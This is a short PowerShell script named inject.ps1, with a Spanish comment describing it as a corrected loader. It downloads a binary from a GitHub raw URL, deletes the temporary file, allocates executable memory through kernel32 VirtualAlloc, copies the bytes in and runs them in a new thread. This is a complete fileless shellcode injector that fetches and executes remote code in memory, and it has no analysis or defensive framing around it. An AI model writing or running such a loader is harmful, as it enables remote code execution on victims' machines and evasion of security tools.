# inject.ps1 - Descarga loader.bin e inyecta en memoria (corregido)
$ErrorActionPreference = 'Stop'
$binUrl = 'https://github.com/DECODERkING/code/raw/main/loader.bin'
$binPath = "$env:TEMP\loader.bin"

(New-Object Net.WebClient).DownloadFile($binUrl, $binPath)
$bytes = [IO.File]::ReadAllBytes($binPath)
Remove-Item $binPath -Force

$k32 = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
'@ -Name 'K32' -Namespace 'Win32' -PassThru

$size  = [UIntPtr]::new($bytes.Length)
$addr  = $k32::VirtualAlloc([IntPtr]::Zero, $size, 0x1000 -bor 0x2000, 0x40)
[Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)

$th = $k32::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$k32::WaitForSingleObject($th, [UInt32]::MaxValue) | Out-Null
